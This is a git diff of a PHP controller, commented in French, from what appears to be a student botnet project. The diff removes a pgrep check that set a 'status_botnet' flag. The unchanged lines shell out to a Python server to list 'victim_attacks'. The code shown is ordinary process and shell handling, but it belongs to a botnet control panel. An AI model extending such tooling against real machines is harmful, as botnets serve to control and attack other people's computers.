@@ -32,24 +32,6 @@ class HomeController extends Controller
         // Récupérer le nombre de groupes créés
         $networkCount = Network::count();
 
-        $nomProcessus = "python3";
-
-        // Exécuter la commande pgrep pour rechercher le processus par nom
-        // Utilisation de -c pour compter le nombre de processus correspondants
-        // Utilisation de -f pour rechercher dans toute la ligne de commande
-        $commande = "pgrep -c -f \"$nomProcessus\"";
-        $resultat = exec($commande);
-
-        // Convertir le résultat en nombre entier
-        $nombreProcessus = intval($resultat);
-
-        // Vérifier si le processus est actif
-        if ($nombreProcessus > 2) {
-            $status_botnet = true;
-        } else {
-            $status_botnet = false;
-        }
-
         // Exécute la commande --showall --target victim_attacks
         exec('/home/debian/PA-BOTNET-PYSRV/venv/bin/python /home/debian/PA-BOTNET-PYSRV/main.py --showall --target victim_attacks', $output, $return);
         //exec('/home/quentin/Documents/Projet_Ann_3ème/vitual_env/bin/python /home/quentin/Documents/Projet_Ann_3ème/PA-BOTNET-PYSRV/main.py --showall --target victim_attacks', $output, $return);
